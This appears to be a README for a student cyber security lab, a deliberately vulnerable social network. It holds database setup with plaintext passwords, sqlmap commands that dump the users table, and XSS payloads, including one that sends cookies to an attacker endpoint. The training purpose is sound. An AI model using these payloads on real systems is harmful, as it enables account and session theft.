# Cyber Security Lab - Vulnerable Social Network

## 📌 Overview
এই ল্যাব প্রজেক্টটি একটি ডেমো সোশ্যাল নেটওয়ার্ক যেখানে **SQL Injection**, **XSS**, এবং **CSRF** এর মতো সাধারণ ওয়েব অ্যাটাক টেস্ট করা যাবে।  
এটি মূলত সাইবার সিকিউরিটি স্টুডেন্টদের জন্য একটি প্র্যাকটিস এনভায়রনমেন্ট।

---

## ⚙️ Database Setup

```bash
sudo mysql -u root -p
SHOW DATABASES;
CREATE DATABASE IF NOT EXISTS mintu;
CREATE USER 'mintu'@'localhost' IDENTIFIED BY 'mintu123';
GRANT ALL PRIVILEGES ON mintu.* TO 'mintu'@'localhost';
FLUSH PRIVILEGES;

sudo mysql -u root -p << 'EOF'
-- ১. ডাটাবেজ তৈরি এবং পারমিশন নিশ্চিত করা
CREATE DATABASE IF NOT EXISTS mintu;
CREATE USER IF NOT EXISTS 'mintu'@'localhost' IDENTIFIED BY 'mintu123';
GRANT ALL PRIVILEGES ON mintu.* TO 'mintu'@'localhost';
FLUSH PRIVILEGES;

USE mintu;

-- ২. Fresh Reset
DROP TABLE IF EXISTS comments;
DROP TABLE IF EXISTS likes;
DROP TABLE IF EXISTS posts;
DROP TABLE IF EXISTS users;

-- ৩. Users Table
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password VARCHAR(255) NOT NULL, -- Vulnerable: Plain text storage
    bio TEXT NULL
);

-- ৪. Posts Table
CREATE TABLE posts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    username VARCHAR(50) NOT NULL,
    content TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ৫. Likes Table
CREATE TABLE likes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    post_id INT NOT NULL,
    user_id INT NOT NULL
);

-- ৬. Comments Table
CREATE TABLE comments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    post_id INT NOT NULL,
    username VARCHAR(50) NOT NULL,
    comment TEXT NOT NULL
);

-- ⁷. Seed Data
INSERT INTO users (id, username, password, bio) VALUES 
(1, 'admin', 'admin123', 'I am the boss of this network.'),
(2, 'victim_user', 'password123', 'Just a regular user enjoying social media.'),
(3, 'mintu_cyber', 'securepass', 'Cyber Security Student & Lab Tester.');

INSERT INTO posts (user_id, username, content) VALUES 
(1, 'admin', 'Welcome to the official Cyber Security Lab Social Network! Report bugs to me.'),
(2, 'victim_user', 'Hello everyone! Does anyone know when the lab final exam starts?');

INSERT INTO comments (post_id, username, comment) VALUES 
(1, 'victim_user', 'Great initiative, admin!'),
(2, 'admin', 'Check the official notice board for exam dates.');
EOF


# ডাটাবেজ লিস্ট
sqlmap -u "http://localhost/labproject/mysocial/profile.php?id=4" --dbs --batch

# Users টেবিলের কলাম বের করা
sqlmap -u "http://localhost/labproject/mysocial/profile.php?id=4" -D mintu -T users --columns --batch

# Users টেবিলের ডাটা ডাম্প করা
sqlmap -u "http://localhost/labproject/mysocial/profile.php?id=4" -D mintu -T users -C bio,id,password,username --dump --batch
<script>alert('Comment XSS Works!')</script>
<script>window.location.href="https://www.bubt.edu.bd/"</script>
<script>alert(document.cookie)</script>

<script>
fetch("http://localhost/labproject/attacker/steal.php?cookie=" + document.cookie);
</script>
sudo chown -R www-data:www-data /var/www/html/labproject/attacker
sudo chown -R www-data:www-data /var/www/html/labproject/mysocial
sudo chmod -R 755 /var/www/html/labproject/attacker
sudo chmod -R 755 /var/www/html/labproject/mysocial



---

এখন এই `README.md` ফাইলটি আপনার প্রজেক্ট ফোল্ডারে রেখে দিলে অন্য কেউও সহজে বুঝতে পারবে কীভাবে সেটআপ ও টেস্ট করতে হবে।           

আপনি চাইলে আমি এটাকে আরও **ফ্লোচার্ট ভিজ্যুয়াল** আকারে সাজিয়ে দিতে পারি, যাতে README তে গ্রাফিকাল ডেমোও থাকে। সেটা চান?

#happy coding
